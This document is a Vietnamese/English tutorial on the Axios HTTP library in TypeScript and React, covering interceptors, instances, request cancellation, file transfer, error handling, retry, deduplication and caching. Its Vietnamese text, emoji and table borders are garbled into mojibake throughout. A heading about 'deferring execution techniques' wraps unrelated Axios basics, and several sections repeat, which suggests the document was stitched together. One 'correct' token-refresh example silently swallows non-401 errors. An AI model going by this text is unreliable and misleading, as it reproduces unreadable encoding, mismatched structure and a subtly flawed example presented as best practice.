**âš ï¸ Common Mistakes - Lá»—i ThÆ°á»ng Gáº·p:**

```typescript
// âŒ Sai: KhÃ´ng cleanup interceptors
useEffect(() => {
  axios.interceptors.request.use(config => config);
  // Missing cleanup!
}, []);

// âœ… ÄÃºng: Always cleanup
useEffect(() => {
  const interceptor = axios.interceptors.request.use(config => config);
  return () => axios.interceptors.request.eject(interceptor);
}, []);

// âŒ Sai: Forget to return config/response
axios.interceptors.request.use(config => {
  config.headers.Authorization = 'Bearer token';
  // Forgot to return config!
});

// âœ… ÄÃºng: Always return
axios.interceptors.request.use(config => {
  config.headers.Authorization = 'Bearer token';
  return config;
});

// âŒ Sai: Infinite loop trong token refresh
axios.interceptors.response.use(
  res => res,
  async (error) => {
    if (error.response?.status === 401) {
      await axios.post('/auth/refresh'); // Uses same instance â†’ infinite loop!
      return axios(error.config);
    }
  }
);

// âœ… ÄÃºng: Use separate instance for refresh
const refreshClient = axios.create();
axios.interceptors.response.use(
  res => res,
  async (error) => {
    if (error.response?.status === 401 && !error.config._retry) {
      error.config._retry = true;
      await refreshClient.post('/auth/refresh');
      return axios(error.config);
    }
  }
);
```

**ğŸ“Š Performance Considerations:**

- **Interceptor Overhead**: Má»—i interceptor adds ~0.1-1ms processing time
- **Memory Usage**: Pending requests map cáº§n cleanup Ä‘á»ƒ avoid memory leaks
- **Request Queueing**: Limit concurrent requests to 5-10 tÃ¹y server capacity
- **Token Refresh**: Queue all requests khi refreshing Ä‘á»ƒ avoid multiple refresh calls
- **Caching**: Cache GET requests trong interceptors Ä‘á»ƒ reduce server load

## **PHáº¦N 2: Axios - Core Features & Advanced Patterns**

### **1. Axios Basics & Comparison**

```typescript
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// BASIC USAGE
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

import axios from 'axios';

// GET, POST, PUT, DELETE
const { data } = await axios.get('/api/users');
await axios.post('/api/users', userData); // âœ… Auto JSON stringify
await axios.put(`/api/users/${id}`, updates);
await axios.delete(`/api/users/${id}`);

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// AXIOS vs FETCH - So sÃ¡nh
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

// âŒ Fetch: Manual JSON parse + error checking
const response = await fetch('/api/users');
if (!response.ok) throw new Error('Failed');
const data = await response.json();

// âœ… Axios: Automatic
const { data } = await axios.get('/api/users');
// Auto parse JSON, auto throw error náº¿u status >= 400

/**
 * Axios Advantages:
 * âœ… Auto JSON transform (request & response)
 * âœ… Auto error handling (throw on 4xx, 5xx)
 * âœ… Built-in timeout, interceptors, CSRF protection
 * âœ… Request/response transformation
 * âœ… Progress events, request cancellation
 * 
 * Fetch Advantages:
 * âœ… Native browser API (no dependencies)
 * âœ… Smaller bundle size
 */
```

---

### **2. Configuration & Instances**

```typescript
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// CREATE AXIOS INSTANCE - Best Practice
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

const apiClient = axios.create({
  baseURL: 'https://api.example.com',
  timeout: 10000,
  headers: { 'Content-Type': 'application/json' },
  withCredentials: true, // CSRF cookies
});

// Multiple instances cho different APIs
const authAPI = axios.create({ baseURL: 'https://auth.example.com' });
const uploadAPI = axios.create({ 
  baseURL: 'https://upload.example.com',
  timeout: 60000, // Large files
});

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// FULL CONFIG OPTIONS (common ones)
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

await axios({
  url: '/users',
  method: 'get',
  headers: { Authorization: 'Bearer token' },
  params: { page: 1, limit: 10 }, // Query string
  data: { name: 'John' }, // Request body
  timeout: 5000,
  responseType: 'json', // 'blob' | 'arraybuffer' | 'text'
  onUploadProgress: (e) => console.log(`${(e.loaded / e.total!) * 100}%`),
  onDownloadProgress: (e) => console.log(`${(e.loaded / e.total!) * 100}%`),
});
```

---

### **3. Request Cancellation**

```typescript
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// ABORT CONTROLLER (Modern)
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

const controller = new AbortController();

axios.get('/api/users', { signal: controller.signal })
  .catch(error => {
    if (axios.isCancel(error)) {
      console.log('Request canceled');
    }
  });

controller.abort(); // Cancel request

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// USE CASE: Cancel on unmount (React)
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

useEffect(() => {
  const controller = new AbortController();
  
  axios.get('/api/users', { signal: controller.signal })
    .then(({ data }) => setUsers(data))
    .catch(error => !axios.isCancel(error) && console.error(error));
  
  return () => controller.abort(); // Cleanup
}, []);
```

---

### **4. File Upload & Download**

```typescript
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// UPLOAD vá»›i Progress
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

const uploadFile = async (file: File) => {
  const formData = new FormData();
  formData.append('file', file);
  
  const { data } = await axios.post('/api/upload', formData, {
    headers: { 'Content-Type': 'multipart/form-data' },
    onUploadProgress: (e) => {
      const percent = Math.round((e.loaded * 100) / e.total!);
      console.log(`Upload: ${percent}%`);
    },
  });
  
  return data;
};

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// DOWNLOAD File
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

const downloadFile = async (fileId: string) => {
  const response = await axios.get(`/api/files/${fileId}`, {
    responseType: 'blob', // Important!
  });
  
  // Trigger download
  const url = window.URL.createObjectURL(new Blob([response.data]));
  const link = document.createElement('a');
  link.href = url;
  link.download = 'filename.pdf';
  link.click();
  window.URL.revokeObjectURL(url);
};
```

---

### **5. Error Handling**

```typescript
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// TYPE-SAFE ERROR HANDLING
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

try {
  const response = await axios.get('/api/users');
} catch (error) {
  if (axios.isAxiosError(error)) {
    if (error.response) {
      // Server responded vá»›i error status
      const { status, data } = error.response;
      
      switch (status) {
        case 400: console.error('Bad Request'); break;
        case 401: window.location.href = '/login'; break;
        case 403: console.error('Forbidden'); break;
        case 404: console.error('Not Found'); break;
        case 422: console.error('Validation:', data.errors); break;
        case 500: console.error('Server Error'); break;
      }
      
    } else if (error.request) {
      // Request sent nhÆ°ng no response (network error, timeout)
      console.error('Network error or timeout');
      
    } else {
      // Error setting up request
      console.error('Request setup error:', error.message);
    }
  }
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// CUSTOM ERROR HANDLER
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

const handleError = (error: unknown) => {
  if (axios.isAxiosError(error)) {
    return {
      success: false,
      message: error.response?.data?.message || error.message,
      status: error.response?.status,
      errors: error.response?.data?.errors, // Validation errors
    };
  }
  return { success: false, message: 'Unexpected error' };
};
```

---

### **6. Advanced Patterns**

```typescript
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// RETRY LOGIC vá»›i Exponential Backoff
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

const axiosRetry = async (config: any, retries = 3) => {
  for (let i = 0; i < retries; i++) {
    try {
      return await axios(config);
    } catch (error) {
      if (i === retries - 1) throw error;
      await new Promise(r => setTimeout(r, 1000 * Math.pow(2, i))); // 1s, 2s, 4s
    }
  }
};

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// REQUEST DEDUPLICATION
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

const pending = new Map<string, Promise<any>>();

const dedupeRequest = async (config: any) => {
  const key = `${config.method}:${config.url}`;
  
  if (pending.has(key)) return pending.get(key); // Reuse pending
  
  const promise = axios(config).finally(() => pending.delete(key));
  pending.set(key, promise);
  return promise;
};

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// RESPONSE CACHING
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

const cache = new Map<string, { data: any; timestamp: number }>();

const cachedRequest = async (url: string, ttl = 5 * 60 * 1000) => {
  const cached = cache.get(url);
  if (cached && Date.now() - cached.timestamp < ttl) {
    return cached.data; // Return cached
  }
  
  const { data } = await axios.get(url);
  cache.set(url, { data, timestamp: Date.now() });
  return data;
};
```

---

### **ğŸ’¡ Best Practices**

```typescript
// âœ… 1. DÃ¹ng instance thay vÃ¬ default axios
const api = axios.create({ baseURL: '/api' });

// âœ… 2. TypeScript types
interface User { id: string; name: string; }
const getUser = async (id: string): Promise<User> => {
  const { data } = await api.get<User>(`/users/${id}`);
  return data;
};

// âœ… 3. Centralize error handling trong interceptors
api.interceptors.response.use(
  response => response,
  error => {
    handleError(error);
    return Promise.reject(error);
  }
);

// âœ… 4. Cancel requests on unmount
useEffect(() => {
  const controller = new AbortController();
  // ... fetch data vá»›i signal
  return () => controller.abort();
}, []);

// âœ… 5. Set timeout Ä‘á»ƒ trÃ¡nh hung requests
axios.create({ timeout: 10000 });

// âœ… 6. Separate auth instance (trÃ¡nh infinite loop trong token refresh)
const authAPI = axios.create({ baseURL: '/auth' });
```

---

<details>
<summary><span style="font-size:1.25em;font-weight:bold;">â±ï¸ Q21: Advanced Deferring Execution Techniques - Ká»¹ Thuáº­t TrÃ¬ HoÃ£n Thá»±c Thi NÃ¢ng Cao</span></summary>


```typescript
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// INSTALLATION
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

// npm install axios
// yarn add axios
// pnpm add axios

import axios from 'axios';

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// BASIC REQUESTS
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

// GET request
const getUsers = async () => {
  try {
    const response = await axios.get('/api/users');
    console.log(response.data); // âœ… Auto JSON parsing
    console.log(response.status); // 200
    console.log(response.headers); // Headers object
    console.log(response.config); // Request config
  } catch (error) {
    console.error(error);
  }
};

// POST request
const createUser = async (userData: any) => {
  const response = await axios.post('/api/users', userData);
  // âœ… Auto JSON stringify - khÃ´ng cáº§n JSON.stringify()
  return response.data;
};

// PUT/PATCH/DELETE
const updateUser = (id: string, data: any) => axios.put(`/api/users/${id}`, data);
const patchUser = (id: string, data: any) => axios.patch(`/api/users/${id}`, data);
const deleteUser = (id: string) => axios.delete(`/api/users/${id}`);
```

#### **1.2. Axios vs Fetch API - So SÃ¡nh Chi Tiáº¿t**

```typescript
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// FETCH API - Nhiá»u bÆ°á»›c thá»§ cÃ´ng
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

// âŒ Fetch: Manual JSON parsing + error checking
const fetchUsers = async () => {
  try {
    const response = await fetch('/api/users');
    
    // âŒ Pháº£i check response.ok manually
    if (!response.ok) {
      throw new Error(`HTTP error! status: ${response.status}`);
    }
    
    // âŒ Pháº£i parse JSON manually
    const data = await response.json();
    return data;
  } catch (error) {
    console.error(error);
  }
};

// POST vá»›i fetch - verbose
const createUserFetch = async (userData: any) => {
  const response = await fetch('/api/users', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json', // âŒ Manual header
    },
    body: JSON.stringify(userData), // âŒ Manual stringify
  });
  
  if (!response.ok) throw new Error('Failed');
  return await response.json(); // âŒ Manual parse
};

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// AXIOS - Tá»± Ä‘á»™ng & ngáº¯n gá»n
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

// âœ… Axios: Clean & automatic
const axiosUsers = async () => {
  const { data } = await axios.get('/api/users');
  // âœ… Auto JSON parse
  // âœ… Auto throw error náº¿u status >= 400
  return data;
};

// POST vá»›i axios - simple
const createUserAxios = async (userData: any) => {
  const { data } = await axios.post('/api/users', userData);
  // âœ… Auto set Content-Type: application/json
  // âœ… Auto JSON.stringify()
  return data;
};

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// COMPARISON TABLE
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

/**
 * â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
 * â”‚ Feature            â”‚ Fetch            â”‚ Axios            â”‚
 * â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
 * â”‚ JSON Transform     â”‚ âŒ Manual        â”‚ âœ… Automatic     â”‚
 * â”‚ Error Handling     â”‚ âŒ Manual check  â”‚ âœ… Auto throw    â”‚
 * â”‚ Timeout            â”‚ âŒ AbortControl  â”‚ âœ… Built-in      â”‚
 * â”‚ Interceptors       â”‚ âŒ None          â”‚ âœ… Built-in      â”‚
 * â”‚ Progress Events    â”‚ âŒ Complex       â”‚ âœ… Easy          â”‚
 * â”‚ Cancel Requests    â”‚ âš ï¸ AbortControl  â”‚ âœ… Multiple ways â”‚
 * â”‚ Browser Support    â”‚ âœ… Native        â”‚ âš ï¸ +13KB bundle  â”‚
 * â”‚ CSRF Protection    â”‚ âŒ Manual        â”‚ âœ… Built-in      â”‚
 * â”‚ Base URL           â”‚ âŒ Manual        â”‚ âœ… Config        â”‚
 * â”‚ Request/Response   â”‚ âŒ None          â”‚ âœ… Transform     â”‚
 * â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
 */
```

</details>

### **2. Axios Instance & Configuration**

#### **2.1. Create Custom Instance**

```typescript
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// CREATE AXIOS INSTANCE - Best Practice
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

import axios, { AxiosInstance } from 'axios';

// Táº¡o instance vá»›i base config
const apiClient: AxiosInstance = axios.create({
  baseURL: process.env.REACT_APP_API_URL || 'https://api.example.com',
  timeout: 10000, // 10 seconds
  headers: {
    'Content-Type': 'application/json',
    'Accept': 'application/json',
  },
  
  // Credentials & CSRF
  withCredentials: true, // Send cookies vá»›i cross-origin requests
  xsrfCookieName: 'XSRF-TOKEN', // CSRF token cookie name
  xsrfHeaderName: 'X-XSRF-TOKEN', // CSRF token header name
  
  // Validate status
  validateStatus: (status) => status >= 200 && status < 500,
});

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// MULTIPLE INSTANCES - Cho different APIs
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

// Main API
const mainAPI = axios.create({
  baseURL: 'https://api.main.com',
  timeout: 5000,
});

// Auth API (separate instance Ä‘á»ƒ trÃ¡nh infinite loop trong token refresh)
const authAPI = axios.create({
  baseURL: 'https://auth.main.com',
  timeout: 3000,
});

// Analytics API
const analyticsAPI = axios.create({
  baseURL: 'https://analytics.main.com',
  timeout: 15000,
});

// File Upload API
const uploadAPI = axios.create({
  baseURL: 'https://upload.main.com',
  timeout: 60000, // 1 minute for large files
  headers: {
    'Content-Type': 'multipart/form-data',
  },
});

// Sá»­ dá»¥ng
mainAPI.get('/users');
authAPI.post('/login', credentials);
analyticsAPI.post('/track', event);
uploadAPI.post('/files', formData);
```

#### **2.2. Full Request Configuration**

```typescript
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// COMPLETE CONFIG OPTIONS
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

const config = {
  // URL
  url: '/users',
  baseURL: 'https://api.example.com',
  
  // Method
  method: 'get', // 'get' | 'post' | 'put' | 'delete' | 'patch' | 'head' | 'options'
  
  // Headers
  headers: {
    'Authorization': 'Bearer token',
    'X-Custom-Header': 'value',
  },
  
  // Query params (?key=value)
  params: {
    page: 1,
    limit: 10,
    sort: 'createdAt:desc',
  },
  
  // Params serializer
  paramsSerializer: {
    serialize: (params) => {
      // Custom serialization
      return Object.entries(params)
        .map(([key, val]) => `${key}=${encodeURIComponent(val)}`)
        .join('&');
    },
  },
  
  // Request body
  data: {
    name: 'John',
    age: 30,
  },
  
  // Timeout
  timeout: 5000, // 5 seconds
  
  // Response type
  responseType: 'json', // 'json' | 'blob' | 'arraybuffer' | 'document' | 'text' | 'stream'
  
  // Response encoding
  responseEncoding: 'utf8',
  
  // Max content length
  maxContentLength: 2000,
  maxBodyLength: 2000,
  
  // Validate status
  validateStatus: (status) => status >= 200 && status < 300,
  
  // Max redirects
  maxRedirects: 5,
  
  // HTTP Auth
  auth: {
    username: 'user',
    password: 'pass',
  },
  
  // Proxy
  proxy: {
    protocol: 'http',
    host: '127.0.0.1',
    port: 9000,
    auth: {
      username: 'proxy-user',
      password: 'proxy-pass',
    },
  },
  
  // Progress events
  onUploadProgress: (progressEvent) => {
    const percentCompleted = Math.round(
      (progressEvent.loaded * 100) / progressEvent.total!
    );
    console.log(`Upload: ${percentCompleted}%`);
  },
  
  onDownloadProgress: (progressEvent) => {
    const percentCompleted = Math.round(
      (progressEvent.loaded * 100) / progressEvent.total!
    );
    console.log(`Download: ${percentCompleted}%`);
  },
  
  // Decompress response
  decompress: true,
};

const response = await axios(config);
```

---

### **3. Request Cancellation - Há»§y Request**

```typescript
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// ABORT CONTROLLER (Modern - Axios 0.22+)
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

const controller = new AbortController();

axios.get('/api/users', {
  signal: controller.signal
}).then(response => {
  console.log(response.data);
}).catch(error => {
  if (axios.isCancel(error)) {
    console.log('Request canceled:', error.message);
  }
});

// Cancel request
controller.abort('User canceled the request');

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// USE CASE 1: Cancel on Component Unmount (React)
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

import { useEffect, useState } from 'react';

function UserList() {
  const [users, setUsers] = useState([]);
  
  useEffect(() => {
    const controller = new AbortController();
    
    const fetchUsers = async () => {
      try {
        const { data } = await axios.get('/api/users', {
          signal: controller.signal
        });
        setUsers(data);
      } catch (error) {
        if (!axios.isCancel(error)) {
          console.error('Error fetching users:', error);
        }
      }
    };
    
    fetchUsers();
    
    // Cleanup: Cancel request khi unmount
    return () => {
      controller.abort();
    };
  }, []);
  
  return <div>...</div>;
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// USE CASE 2: Cancel Previous Search Request
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

function SearchComponent() {
  const [query, setQuery] = useState('');
  const controllerRef = useRef<AbortController | null>(null);
  
  const handleSearch = async (searchQuery: string) => {
    // Cancel previous request náº¿u cÃ³
    if (controllerRef.current) {
      controllerRef.current.abort();
    }
    
    // Create new controller
    controllerRef.current = new AbortController();
    
    try {
      const { data } = await axios.get('/api/search', {
        params: { q: searchQuery },
        signal: controllerRef.current.signal
      });
      setResults(data);
    } catch (error) {
      if (!axios.isCancel(error)) {
        console.error('Search error:', error);
      }
    }
  };
  
  // Debounce search
  useEffect(() => {
    const timer = setTimeout(() => {
      if (query) {
        handleSearch(query);
      }
    }, 500);
    
    return () => clearTimeout(timer);
  }, [query]);
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// CANCEL TOKEN (Legacy - Deprecated nhÆ°ng váº«n hoáº¡t Ä‘á»™ng)
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

const CancelToken = axios.CancelToken;
const source = CancelToken.source();

axios.get('/api/users', {
  cancelToken: source.token
}).catch(error => {
  if (axios.isCancel(error)) {
    console.log('Request canceled:', error.message);
  }
});

// Cancel
source.cancel('Operation canceled by user');
```

---

### **4. File Upload & Download**

#### **4.1. File Upload with Progress**

```typescript
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// UPLOAD SINGLE FILE
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

const uploadFile = async (file: File) => {
  const formData = new FormData();
  formData.append('file', file);
  formData.append('userId', '123');
  
  try {
    const { data } = await axios.post('/api/upload', formData, {
      headers: {
        'Content-Type': 'multipart/form-data',
      },
